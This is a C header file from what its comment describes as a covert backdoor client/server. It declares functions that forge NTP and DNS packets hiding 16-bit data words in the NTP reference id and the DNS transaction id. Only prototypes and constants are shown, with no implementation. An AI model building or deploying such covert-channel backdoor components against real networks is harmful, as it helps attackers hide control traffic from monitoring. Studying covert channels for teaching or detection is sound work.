#ifndef NTP_H
#define NTP_H

/*
SOURCE FILE: covert.h

PROGRAM: Backdoor - A covert backdoor client/server using libpcap and raw sockets.

DATE: November 29, 2011

REVISIONS:
	1.0 - October 23
	1.1 - November 29, 2011

DESIGNERS:
	Martin Casado
	Modified by Aman Abdulla
  Modified by Santana Mach and Steve Stanisic

PROGRAMMERS:
  Modified by Santana Mach and Steve Stanisic

NOTES: This file contains functionality to forge application layer packets, specifically
	for the NTP and DNS protocols.
*/

#include "defs.h"

#define PORT_NTP  123
#define PORT_DNS  53
#define NTP_SIZ   48
#define DNS_SIZ   32

/*
FUNCTION: make_vanilla_ntp

PARAMS:
	char* buff: The buffer to place the request in.

RETURN: none.

NOTES: Call this function to make a standard NTP packet.
*/
void make_vanilla_ntp(char* buff);

/*
FUNCTION: make_covert_ntp

PARAMS:
	char* buff: The buffer to place the request in.
	uint16 data: The covert word to hide in the ref_id.

RETURN: none.

NOTES: Call this function to make an NTP packet with a covert word
	in the low bytes of the ref_id.
*/
void make_covert_ntp(char* buff, uint16 data);

/*
FUNCTION: make_covert_dns

PARAMS:
	char* buff: The buffer to place the request in.
	uint16 data: The covert word to hide in the ref_id.

RETURN: none.

NOTES: Call this function to make an DNS packet with a covert word
	in the transaction id.
*/
void make_covert_dns(char* buff, uint16 data);

/*
FUNCTION: getsec

PARAMS: none.

RETURN: The number of seconds since the epoch.

NOTES: Call this function to get the number of seconds since the epoch.
*/
uint64 getsec();

#endif
